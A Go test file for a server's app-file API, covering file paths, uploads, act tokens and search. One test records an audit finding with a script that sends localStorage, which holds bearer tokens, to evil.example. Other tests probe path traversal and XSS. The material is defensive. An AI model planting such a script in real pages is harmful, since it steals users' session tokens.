package server

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
	"time"

	"poggers.institute/freshbreath/internal/db"
)

// ── App files by path ──
//
// /api/apps/{nonce}/web/<path> addresses one file (GET/PUT/DELETE) or folder
// (GET lists, POST bulk-uploads into it). The bare /web lists the root,
// takes a whole-slot upload and a whole-slot DELETE; the zip lives at
// /download. PUT is a full-file raw-body replace; patches stay MCP-only.

func TestAppWebFileGet(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "getapp")
	createAppFile(t, srv, nonce, "index.html", []byte("<html><body>hi</body></html>"))

	rr := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/index.html", nil, nil)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%q", rr.Code, rr.Body.String())
	}
	if got := rr.Body.String(); got != "<html><body>hi</body></html>" {
		t.Fatalf("body = %q, want the file contents", got)
	}
	if ct := rr.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/html") {
		t.Fatalf("Content-Type = %q, want text/html (sniffed)", ct)
	}
}

// A Member of an app can publish script into its web area, and the hosted
// page is served un-sandboxed on the control panel's own origin — the same
// origin /control keeps its bearer token in localStorage["frbr:auth:<id>"]
// on. (The data area, by contrast, is always sandboxed — see
// TestAppDataFileRoundTrip.) KNOWN FINDING (audit 2026, F5): flip the CSP
// assertion into a regression test (want "sandbox") when the fix lands.
func TestHostedAppMemberPageRunsOnPanelOrigin(t *testing.T) {
	srv := newTestServer(t)
	srv.config.DataDir = t.TempDir()
	member := mustUser(t, srv, "Mel", "Member", "Active")
	nonce, err := srv.store.CreateApp("Team Wiki", "", "", nil, nil)
	if err != nil {
		t.Fatalf("create app: %v", err)
	}
	anon := builtinAuth(t, srv, db.AuthAnonymous)
	if err := srv.store.UpdateApp(nonce, "Team Wiki", "", "", nil, &anon.ID); err != nil {
		t.Fatalf("open the gate: %v", err)
	}
	if err := srv.store.SetAppMembers(nonce, []int64{member.ID}); err != nil {
		t.Fatalf("add member: %v", err)
	}
	steal := `<script>fetch("https://evil.example/c",{method:"POST",body:JSON.stringify(localStorage)})</script>`
	if err := srv.coreWriteAppFile(member, nonce, "web", "index.html", []byte(steal), ""); err != nil {
		t.Fatalf("member writes page: %v", err)
	}

	rr := testRequest(t, srv, http.MethodGet, "/team-wiki/", nil, nil)
	if rr.Code != http.StatusOK || !strings.Contains(rr.Body.String(), "localStorage") {
		t.Fatalf("hosted page = %d %q, want the member-authored page", rr.Code, rr.Body.String())
	}
	if csp := rr.Header().Get("Content-Security-Policy"); strings.Contains(csp, "sandbox") {
		t.Errorf("Content-Security-Policy = %q, want un-sandboxed (finding F5: member script on the panel origin)", csp)
	}
}

func TestAppWebFileGetNested(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "nested")
	createAppFile(t, srv, nonce, "css/site.css", []byte("body{color:red}"))

	rr := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/css/site.css", nil, nil)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%q", rr.Code, rr.Body.String())
	}
	if got := rr.Body.String(); got != "body{color:red}" {
		t.Fatalf("body = %q, want nested file contents", got)
	}
}

func TestAppWebFileGetMissing(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "miss")
	rr := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/nope.html", nil, nil)
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want 404 for missing file", rr.Code)
	}
}

func TestAppWebFileGetBadPath(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "badpath")
	// The mux cleans ".." out of a path before it reaches us (a redirect)...
	rr := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/../etc/passwd", nil, nil)
	if rr.Code == http.StatusOK {
		t.Fatalf("status = %d, want the traversal turned away", rr.Code)
	}
	// ...and the core refuses one on its own, whatever route reaches it.
	su := &db.User{ID: 1, Role: "Superuser"}
	if _, _, err := srv.coreGetAppPath(su, nonce, "web", "../etc/passwd"); err == nil {
		t.Fatal("coreGetAppPath allowed a traversal")
	}
}

func TestAppWebFilePut(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "putapp")
	rr := testRequest(t, srv, http.MethodPut, "/api/apps/"+nonce+"/web/notes.txt",
		bytes.NewReader([]byte("hello put\n")), map[string]string{"Content-Type": "text/plain"})
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want 204; body=%q", rr.Code, rr.Body.String())
	}
	// read back through the same path GET — round-trips
	rr2 := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/notes.txt", nil, nil)
	if rr2.Code != http.StatusOK || rr2.Body.String() != "hello put\n" {
		t.Fatalf("readback = %d %q", rr2.Code, rr2.Body.String())
	}
}

func TestAppWebFilePutCreatesMissingDirs(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "putdirs")
	rr := testRequest(t, srv, http.MethodPut, "/api/apps/"+nonce+"/web/new/deep/page.html",
		bytes.NewReader([]byte("<p>ok</p>")), map[string]string{"Content-Type": "text/html"})
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want 204; body=%q", rr.Code, rr.Body.String())
	}
	rr2 := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/new/deep/page.html", nil, nil)
	if rr2.Code != http.StatusOK || rr2.Body.String() != "<p>ok</p>" {
		t.Fatalf("readback = %d %q", rr2.Code, rr2.Body.String())
	}
}

func TestAppWebFileDelete(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "delapp")
	createAppFile(t, srv, nonce, "gone.txt", []byte("bye"))

	rr := testRequest(t, srv, http.MethodDelete, "/api/apps/"+nonce+"/web/gone.txt", nil, nil)
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want 204", rr.Code)
	}
	rr2 := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/gone.txt", nil, nil)
	if rr2.Code != http.StatusNotFound {
		t.Fatalf("readback status = %d, want 404 after delete", rr2.Code)
	}
}

func TestAppWebFileDeleteMissing(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "delmiss")
	rr := testRequest(t, srv, http.MethodDelete, "/api/apps/"+nonce+"/web/absent.txt", nil, nil)
	if rr.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want 404 for deleting a missing file", rr.Code)
	}
}

func TestAppWebPutWithoutFile(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "putnofile")
	rr := testRequest(t, srv, http.MethodPut, "/api/apps/"+nonce+"/web", bytes.NewReader([]byte("x")), nil)
	if rr.Code != http.StatusMethodNotAllowed {
		t.Fatalf("status = %d, want 405 (PUT needs a file path)", rr.Code)
	}
}

// TestAppDownloadZip pins the bulk download at /download.
func TestAppDownloadZip(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "zipapp")
	createAppFile(t, srv, nonce, "a.txt", []byte("aaa"))

	rr := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/download", nil, nil)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rr.Code)
	}
	if ct := rr.Header().Get("Content-Type"); ct != "application/zip" {
		t.Fatalf("Content-Type = %q, want application/zip", ct)
	}
}

// ── Service PUT raw-body ──
//
// /api/services/{id}/files grows a PUT (raw body) for full-definition write;
// existing GET/POST/DELETE stay. PUT = full replace (coreWriteServiceFile with
// empty oldText); POST stays the multipart control-panel upload. Services
// have no ?file= — the definition path is server-derived.

func TestServiceFilesPutTasks(t *testing.T) {
	srv := newTestServer(t)
	id := registerService(t, srv, "tasks-svc", "http://tasks", db.ServiceDescriptor{Type: "tasks"})

	rr := testRequest(t, srv, http.MethodPut, "/api/services/"+id+"/files",
		bytes.NewReader([]byte("- do stuff\n- do more")), map[string]string{"Content-Type": "text/plain"})
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want 204; body=%q", rr.Code, rr.Body.String())
	}
	data, _, err := srv.coreReadServiceFile(&db.User{ID: 1, Role: "Superuser"}, parseServiceID(t, id), 0, 0)
	if err != nil {
		t.Fatalf("readback core: %v", err)
	}
	if string(data) != "- do stuff\n- do more" {
		t.Fatalf("readback = %q, want the PUT body", string(data))
	}
}

func TestServiceFilesPutVirtual(t *testing.T) {
	srv := newTestServer(t)
	id := registerService(t, srv, "virt-svc", "http://virt", db.ServiceDescriptor{Type: "virtual"})

	rr := testRequest(t, srv, http.MethodPut, "/api/services/"+id+"/files",
		bytes.NewReader([]byte("virtual body")), map[string]string{"Content-Type": "text/plain"})
	if rr.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want 204; body=%q", rr.Code, rr.Body.String())
	}
}

func TestServiceFilesPutNonPublishable(t *testing.T) {
	srv := newTestServer(t)
	id := registerService(t, srv, "mcp-svc", "http://mcp", db.ServiceDescriptor{Type: "mcp"})

	rr := testRequest(t, srv, http.MethodPut, "/api/services/"+id+"/files", bytes.NewReader([]byte("x")), nil)
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400 (mcp services don't publish files)", rr.Code)
	}
}

// ── Act-token equivalence ──
//
// These are the deferred Phase-1 dispatch tests: the file-path PUT must
// behave the same whether the request comes in directly (auth-off synthetic
// superuser here) or via an act-token dispatch (real Admin user Ada). Same
// handler, same authz gates, same bytes — the act token is just a second way
// to get a user into the context.

func TestActTokenAppFileGet(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "actget")
	createAppFile(t, srv, nonce, "index.html", []byte("<h1>act</h1>"))
	ada := createActUser(t, srv)

	tok, err := srv.mintActToken(ada, http.MethodGet, "/api/apps/"+nonce+"/web/index.html", 5*time.Minute)
	if err != nil {
		t.Fatalf("mint: %v", err)
	}
	direct := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/index.html", nil, nil)
	viaAct := testRequest(t, srv, http.MethodGet, "/api/act/"+tok, nil, nil)

	if viaAct.Code != direct.Code {
		t.Fatalf("act status %d != direct %d", viaAct.Code, direct.Code)
	}
	if viaAct.Body.String() != direct.Body.String() {
		t.Fatalf("act body %q != direct %q", viaAct.Body.String(), direct.Body.String())
	}
	if viaAct.Header().Get("Content-Type") != direct.Header().Get("Content-Type") {
		t.Fatalf("act Content-Type %q != direct %q", viaAct.Header().Get("Content-Type"), direct.Header().Get("Content-Type"))
	}
}

func TestActTokenAppFilePut(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "actput")
	ada := createActUser(t, srv)

	tok, err := srv.mintActToken(ada, http.MethodPut, "/api/apps/"+nonce+"/web/via-act.txt", 5*time.Minute)
	if err != nil {
		t.Fatalf("mint: %v", err)
	}
	rr := testRequest(t, srv, http.MethodPut, "/api/act/"+tok,
		bytes.NewReader([]byte("written via act token\n")), map[string]string{"Content-Type": "text/plain"})
	if rr.Code != http.StatusNoContent {
		t.Fatalf("act PUT status = %d, want 204; body=%q", rr.Code, rr.Body.String())
	}
	// read back via a direct GET — proves the bytes landed on disk
	rr2 := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/via-act.txt", nil, nil)
	if rr2.Code != http.StatusOK || rr2.Body.String() != "written via act token\n" {
		t.Fatalf("readback = %d %q", rr2.Code, rr2.Body.String())
	}
}

func TestActTokenAppFileDelete(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "actdel")
	createAppFile(t, srv, nonce, "killme.txt", []byte("doomed"))
	ada := createActUser(t, srv)

	tok, err := srv.mintActToken(ada, http.MethodDelete, "/api/apps/"+nonce+"/web/killme.txt", 5*time.Minute)
	if err != nil {
		t.Fatalf("mint: %v", err)
	}
	rr := testRequest(t, srv, http.MethodDelete, "/api/act/"+tok, nil, nil)
	if rr.Code != http.StatusNoContent {
		t.Fatalf("act DELETE status = %d, want 204; body=%q", rr.Code, rr.Body.String())
	}
	rr2 := testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/web/killme.txt", nil, nil)
	if rr2.Code != http.StatusNotFound {
		t.Fatalf("readback = %d, want 404 after act-token delete", rr2.Code)
	}
}

func TestActTokenServiceFilePut(t *testing.T) {
	srv := newTestServer(t)
	id := registerService(t, srv, "act-tasks", "http://act-tasks", db.ServiceDescriptor{Type: "virtual"})
	ada := createActUser(t, srv)

	tok, err := srv.mintActToken(ada, http.MethodPut, "/api/services/"+id+"/files", 5*time.Minute)
	if err != nil {
		t.Fatalf("mint: %v", err)
	}
	rr := testRequest(t, srv, http.MethodPut, "/api/act/"+tok,
		bytes.NewReader([]byte("via act\n")), map[string]string{"Content-Type": "text/plain"})
	if rr.Code != http.StatusNoContent {
		t.Fatalf("act service PUT status = %d, want 204; body=%q", rr.Code, rr.Body.String())
	}
	data, _, err := srv.coreReadServiceFile(&db.User{ID: 1, Role: "Superuser"}, parseServiceID(t, id), 0, 0)
	if err != nil || string(data) != "via act\n" {
		t.Fatalf("readback = %q err=%v", string(data), err)
	}
}

// TestActTokenServiceFilePutMemberDenied pins the trust boundary: an act
// token authenticates (the holder is a real user) but does not bypass
// authorization. A Member-rank user's act token reaches the handler — the
// authWrap short-circuit honors the pre-set userKey — but coreWriteServiceFile's
// gate(actor, rolesAdminPlus) still rejects with 403. The capability gets you
// in the door; your role decides the room.
func TestActTokenServiceFilePutMemberDenied(t *testing.T) {
	srv := newTestServer(t)
	id := registerService(t, srv, "act-tasks-member", "http://act-tasks-m", db.ServiceDescriptor{Type: "tasks"})
	member, err := srv.store.CreateUser("Melly", "melly@example.com", "Member", "Active")
	if err != nil {
		t.Fatalf("create member: %v", err)
	}
	tok, err := srv.mintActToken(member, http.MethodPut, "/api/services/"+id+"/files", 5*time.Minute)
	if err != nil {
		t.Fatalf("mint: %v", err)
	}
	rr := testRequest(t, srv, http.MethodPut, "/api/act/"+tok,
		bytes.NewReader([]byte("nope")), map[string]string{"Content-Type": "text/plain"})
	if rr.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403 (Member can't write service files; gate intact)", rr.Code)
	}
}

// parseServiceID converts the string id registerService returns back to int64.
func parseServiceID(t *testing.T, id string) int64 {
	t.Helper()
	n, err := strconv.ParseInt(id, 10, 64)
	if err != nil {
		t.Fatalf("parse service id %q: %v", id, err)
	}
	return n
}

func TestSearchAppFilesHTTP(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "searchable")
	createAppFile(t, srv, nonce, "index.html", []byte("one\nTwo\nthree"))

	rr := testRequest(t, srv, http.MethodGet, "/api/apps/search?pattern=two&ignore_case=true&nonce="+nonce, nil, nil)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%q", rr.Code, rr.Body.String())
	}
	want := `{"matches":[{"nonce":"` + nonce + `","app":"searchable","path":"index.html","line":2,"text":"Two"}],"truncated":false}`
	if got := strings.TrimSpace(rr.Body.String()); got != want {
		t.Fatalf("body = %s, want %s", got, want)
	}

	rr = testRequest(t, srv, http.MethodGet, "/api/apps/search", nil, nil)
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("missing pattern: status = %d, want 400", rr.Code)
	}
}

// ── App data area ──
//
// /api/apps/{nonce}/data mirrors /web's path ops for files the web server
// never hosts; a bare GET lists them.

func TestAppDataFileRoundTrip(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "dataapp")
	createAppFile(t, srv, nonce, "index.html", []byte("<h1>site</h1>"))

	rr := testRequest(t, srv, http.MethodPut, "/api/apps/"+nonce+"/data/uploads/evil.html", bytes.NewReader([]byte("<script>alert(1)</script>")), nil)
	if rr.Code != http.StatusNoContent {
		t.Fatalf("PUT status = %d, want 204; body=%q", rr.Code, rr.Body.String())
	}

	rr = testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/data/uploads/evil.html", nil, nil)
	if rr.Code != http.StatusOK || rr.Body.String() != "<script>alert(1)</script>" {
		t.Fatalf("GET = %d %q, want the stored bytes", rr.Code, rr.Body.String())
	}
	if csp := rr.Header().Get("Content-Security-Policy"); !strings.HasPrefix(csp, "sandbox") {
		t.Errorf("Content-Security-Policy = %q, want sandbox", csp)
	}

	// Listing shows it; the web area doesn't.
	rr = testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/data", nil, nil)
	want := `{"files":[{"path":"uploads/evil.html","size":25}]}`
	if got := strings.TrimSpace(rr.Body.String()); got != want {
		t.Fatalf("list = %s, want %s", got, want)
	}
	webFiles, _ := srv.coreListAppFiles(&db.User{ID: 1, Role: "Superuser"}, nonce, "web", "", "")
	if len(webFiles) != 1 || webFiles[0].Path != "index.html" {
		t.Errorf("web files = %+v, want only index.html", webFiles)
	}

	// The hosted app can't reach it, even by climbing out of the slot.
	for _, p := range []string{"/dataapp/uploads/evil.html", "/dataapp/../data/uploads/evil.html", "/dataapp/%2e%2e/data/uploads/evil.html"} {
		rr = testRequest(t, srv, http.MethodGet, p, nil, nil)
		if strings.Contains(rr.Body.String(), "alert(1)") {
			t.Errorf("GET %s served the data file", p)
		}
	}

	rr = testRequest(t, srv, http.MethodDelete, "/api/apps/"+nonce+"/data/uploads/evil.html", nil, nil)
	if rr.Code != http.StatusNoContent {
		t.Fatalf("DELETE status = %d, want 204", rr.Code)
	}
	rr = testRequest(t, srv, http.MethodGet, "/api/apps/"+nonce+"/data/uploads/evil.html", nil, nil)
	if rr.Code != http.StatusNotFound {
		t.Fatalf("GET after delete = %d, want 404", rr.Code)
	}
}

func TestAppDataSurvivesWebReplace(t *testing.T) {
	srv := newTestServer(t)
	su := &db.User{ID: 1, Role: "Superuser"}
	nonce := createApp(t, srv, "keepdata")
	if err := srv.coreWriteAppFile(su, nonce, "data", "keep.txt", []byte("kept"), ""); err != nil {
		t.Fatalf("write data: %v", err)
	}
	if _, err := srv.coreUploadAppWeb(su, nonce, "", []uploadFile{{Name: "index.html", Data: []byte("<h1>v2</h1>")}}); err != nil {
		t.Fatalf("upload web: %v", err)
	}
	if err := srv.coreDeleteAppWeb(su, nonce); err != nil {
		t.Fatalf("delete web: %v", err)
	}
	data, err := srv.coreReadAppFile(su, nonce, "data", "keep.txt", 0, 0)
	if err != nil || string(data) != "kept" {
		t.Fatalf("data after web replace/delete = %q, %v; want kept", data, err)
	}
}

// ── Bulk uploads ──
//
// Upload POSTs take any number of "file" parts; each part's filename is its
// relative path.

func postFiles(t *testing.T, srv *Server, url string, files map[string][]byte) *httptest.ResponseRecorder {
	t.Helper()
	var body bytes.Buffer
	mw := multipart.NewWriter(&body)
	for name, data := range files {
		fw, err := mw.CreateFormFile("file", name)
		if err != nil {
			t.Fatalf("create form file: %v", err)
		}
		fw.Write(data)
	}
	mw.Close()
	return testRequest(t, srv, http.MethodPost, url, &body, map[string]string{"Content-Type": mw.FormDataContentType()})
}

func zipBytes(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, content := range files {
		w, _ := zw.Create(name)
		w.Write([]byte(content))
	}
	zw.Close()
	return buf.Bytes()
}

func webFileSet(t *testing.T, srv *Server, nonce string) map[string]bool {
	t.Helper()
	files, err := srv.coreListAppFiles(&db.User{ID: 1, Role: "Superuser"}, nonce, "web", "", "")
	if err != nil {
		t.Fatalf("list: %v", err)
	}
	set := map[string]bool{}
	for _, f := range files {
		set[f.Path] = true
	}
	return set
}

func TestAppWebUploadBundles(t *testing.T) {
	cases := []struct {
		name  string
		files map[string][]byte
		want  []string
	}{
		{"lone page becomes index", map[string][]byte{"game.html": []byte("<h1>g</h1>")},
			[]string{"index.html"}},
		{"zip with a top folder", map[string][]byte{"site.zip": zipBytes(t, map[string]string{"site/main.html": "m", "site/js/app.js": "a"})},
			[]string{"index.html", "js/app.js"}},
		{"dropped folder is unwrapped", map[string][]byte{"dist/index.html": []byte("i"), "dist/css/site.css": []byte("c"), "dist/about.html": []byte("a")},
			[]string{"index.html", "css/site.css", "about.html"}},
		{"loose files keep their paths", map[string][]byte{"index.html": []byte("i"), "style.css": []byte("s"), "img/logo.png": []byte("p")},
			[]string{"index.html", "style.css", "img/logo.png"}},
		{"zip expands beside loose files", map[string][]byte{"index.html": []byte("i"), "vendor/lib.zip": zipBytes(t, map[string]string{"lib.js": "l"})},
			[]string{"index.html", "vendor/lib.js"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			srv := newTestServer(t)
			nonce := createApp(t, srv, "bundle")
			createAppFile(t, srv, nonce, "stale.txt", []byte("old"))

			rr := postFiles(t, srv, "/api/apps/"+nonce+"/web", tc.files)
			if rr.Code != http.StatusOK {
				t.Fatalf("status = %d, body = %s", rr.Code, rr.Body.String())
			}
			got := webFileSet(t, srv, nonce)
			if len(got) != len(tc.want) {
				t.Errorf("files = %v, want %v (stale files cleared)", got, tc.want)
			}
			for _, w := range tc.want {
				if !got[w] {
					t.Errorf("missing %s in %v", w, got)
				}
			}
		})
	}
}

func TestAppWebUploadRejectsKeepOldFiles(t *testing.T) {
	cases := map[string]map[string][]byte{
		"no html":       {"style.css": []byte("s")},
		"escaping path": {"../evil.html": []byte("e")},
		"broken zip":    {"site.zip": []byte("not a zip")},
	}
	for name, files := range cases {
		t.Run(name, func(t *testing.T) {
			srv := newTestServer(t)
			nonce := createApp(t, srv, "keep")
			createAppFile(t, srv, nonce, "index.html", []byte("live"))

			rr := postFiles(t, srv, "/api/apps/"+nonce+"/web", files)
			if rr.Code != http.StatusBadRequest {
				t.Fatalf("status = %d, want 400; body = %s", rr.Code, rr.Body.String())
			}
			data, err := srv.coreReadAppFile(&db.User{ID: 1, Role: "Superuser"}, nonce, "web", "index.html", 0, 0)
			if err != nil || string(data) != "live" {
				t.Fatalf("index.html = %q, %v; want the old file untouched", data, err)
			}
		})
	}
}

func TestAppDataBulkUpload(t *testing.T) {
	srv := newTestServer(t)
	su := &db.User{ID: 1, Role: "Superuser"}
	nonce := createApp(t, srv, "uploads")
	if err := srv.coreWriteAppFile(su, nonce, "data", "existing.txt", []byte("kept"), ""); err != nil {
		t.Fatalf("seed: %v", err)
	}

	archive := zipBytes(t, map[string]string{"inner.txt": "x"})
	rr := postFiles(t, srv, "/api/apps/"+nonce+"/data", map[string][]byte{
		"photos/a.jpg": []byte("jpeg"),
		"backup.zip":   archive,
	})
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rr.Code, rr.Body.String())
	}

	files, _ := srv.coreListAppFiles(su, nonce, "data", "", "")
	got := map[string]int64{}
	for _, f := range files {
		got[f.Path] = f.Size
	}
	if len(got) != 3 || got["existing.txt"] != 4 || got["photos/a.jpg"] != 4 || got["backup.zip"] != int64(len(archive)) {
		t.Errorf("data files = %v, want existing.txt kept, photos/a.jpg added, backup.zip stored unexpanded", got)
	}

	rr = postFiles(t, srv, "/api/apps/"+nonce+"/data", map[string][]byte{"ok.txt": []byte("o"), "../escape.txt": []byte("e")})
	if rr.Code != http.StatusBadRequest {
		t.Fatalf("escaping path: status = %d, want 400", rr.Code)
	}
	if _, err := srv.coreReadAppFile(su, nonce, "data", "ok.txt", 0, 0); err == nil {
		t.Errorf("ok.txt written despite a rejected sibling; uploads should be all-or-nothing on path checks")
	}
}

// ── Narrowing to a folder ──

// A GET answers for whatever the path is: a folder lists (paths stay
// relative to the area's root), a file returns its bytes, and the bare
// area lists everything.
func TestAppFilesGetFolderOrFile(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "blog")
	createAppFile(t, srv, nonce, "index.html", []byte("home"))
	createAppFile(t, srv, nonce, "blog/2026/jan.md", []byte("january"))
	createAppFile(t, srv, nonce, "blog/2026/feb.md", []byte("february"))
	createAppFile(t, srv, nonce, "blog/2025/dec.md", []byte("december"))

	list := func(path string) []string {
		t.Helper()
		rr := testRequest(t, srv, http.MethodGet, path, nil, nil)
		if rr.Code != http.StatusOK {
			t.Fatalf("GET %s = %d %s", path, rr.Code, rr.Body.String())
		}
		var out struct{ Files []appFile }
		if err := json.Unmarshal(rr.Body.Bytes(), &out); err != nil {
			t.Fatalf("GET %s: not a listing: %s", path, rr.Body.String())
		}
		var paths []string
		for _, f := range out.Files {
			paths = append(paths, f.Path)
		}
		return paths
	}
	base := "/api/apps/" + nonce + "/web"
	if got := fmt.Sprint(list(base + "/blog/2026")); got != "[blog/2026/feb.md blog/2026/jan.md]" {
		t.Errorf("folder listing = %s", got)
	}
	if got := list(base); len(got) != 4 {
		t.Errorf("root listing = %v, want all 4 files", got)
	}
	if got := fmt.Sprint(list(base + "/blog?search=dec")); got != "[blog/2025/dec.md]" {
		t.Errorf("searched listing = %s", got)
	}

	rr := testRequest(t, srv, http.MethodGet, base+"/blog/2026/jan.md", nil, nil)
	if rr.Code != http.StatusOK || rr.Body.String() != "january" {
		t.Errorf("file GET = %d %q, want january", rr.Code, rr.Body.String())
	}
	if rr := testRequest(t, srv, http.MethodGet, base+"/blog/2024", nil, nil); rr.Code != http.StatusNotFound {
		t.Errorf("missing folder = %d, want 404", rr.Code)
	}
	if rr := testRequest(t, srv, http.MethodDelete, base+"/blog/2026", nil, nil); rr.Code != http.StatusBadRequest {
		t.Errorf("DELETE on a folder = %d, want 400", rr.Code)
	}
}

// A web upload into a folder replaces just that folder: no index.html
// needed, siblings and the rest of the slot untouched.
func TestAppWebUploadIntoFolder(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "blog")
	createAppFile(t, srv, nonce, "index.html", []byte("home"))
	createAppFile(t, srv, nonce, "blog/2026/stale.md", []byte("old"))
	createAppFile(t, srv, nonce, "blog/2025/dec.md", []byte("december"))

	rr := postFiles(t, srv, "/api/apps/"+nonce+"/web/blog/2026", map[string][]byte{
		"jan.md":        []byte("january"),
		"img/cover.png": []byte("png"),
	})
	if rr.Code != http.StatusOK {
		t.Fatalf("upload = %d %s", rr.Code, rr.Body.String())
	}
	got := webFileSet(t, srv, nonce)
	want := []string{"index.html", "blog/2025/dec.md", "blog/2026/jan.md", "blog/2026/img/cover.png"}
	if len(got) != len(want) {
		t.Errorf("files = %v, want %v (stale.md cleared, the rest kept)", got, want)
	}
	for _, w := range want {
		if !got[w] {
			t.Errorf("missing %s in %v", w, got)
		}
	}

	// A folder that's really a file is refused, and nothing is touched.
	rr = postFiles(t, srv, "/api/apps/"+nonce+"/web/index.html", map[string][]byte{"x.md": []byte("x")})
	if rr.Code != http.StatusBadRequest {
		t.Errorf("upload onto a file = %d, want 400", rr.Code)
	}
}

// A data upload into a folder adds under it, leaving what's there.
func TestAppDataUploadIntoFolder(t *testing.T) {
	srv := newTestServer(t)
	su := &db.User{ID: 1, Role: "Superuser"}
	nonce := createApp(t, srv, "uploads")
	if err := srv.coreWriteAppFile(su, nonce, "data", "photos/2026/old.jpg", []byte("old"), ""); err != nil {
		t.Fatalf("seed: %v", err)
	}
	rr := postFiles(t, srv, "/api/apps/"+nonce+"/data/photos/2026", map[string][]byte{"new.jpg": []byte("new")})
	if rr.Code != http.StatusOK {
		t.Fatalf("upload = %d %s", rr.Code, rr.Body.String())
	}
	var out struct{ Files []string }
	json.Unmarshal(rr.Body.Bytes(), &out)
	if fmt.Sprint(out.Files) != "[photos/2026/new.jpg]" {
		t.Errorf("written = %v, want root-relative paths", out.Files)
	}
	files, _ := srv.coreListAppFiles(su, nonce, "data", "photos/2026", "")
	if len(files) != 2 {
		t.Errorf("data folder = %v, want old.jpg kept beside new.jpg", files)
	}
}

// Search narrows to a folder; one app asked for by name 404s on a folder
// it doesn't have, while an all-apps search just skips those apps.
func TestSearchAppFilesInFolder(t *testing.T) {
	srv := newTestServer(t)
	nonce := createApp(t, srv, "blog")
	createAppFile(t, srv, nonce, "blog/2026/jan.md", []byte("needle in 2026"))
	createAppFile(t, srv, nonce, "blog/2025/dec.md", []byte("needle in 2025"))

	rr := testRequest(t, srv, http.MethodGet, "/api/apps/search?nonce="+nonce+"&dir=blog/2026&pattern=needle", nil, nil)
	var out struct{ Matches []appFileMatch }
	json.Unmarshal(rr.Body.Bytes(), &out)
	if rr.Code != http.StatusOK || len(out.Matches) != 1 || out.Matches[0].Path != "blog/2026/jan.md" {
		t.Errorf("search = %d %s, want only blog/2026/jan.md", rr.Code, rr.Body.String())
	}
	if rr := testRequest(t, srv, http.MethodGet, "/api/apps/search?nonce="+nonce+"&dir=nope&pattern=needle", nil, nil); rr.Code != http.StatusNotFound {
		t.Errorf("missing folder in one app = %d, want 404", rr.Code)
	}
	if rr := testRequest(t, srv, http.MethodGet, "/api/apps/search?dir=nope&pattern=needle", nil, nil); rr.Code != http.StatusOK {
		t.Errorf("missing folder across apps = %d, want 200 (skipped)", rr.Code)
	}
}
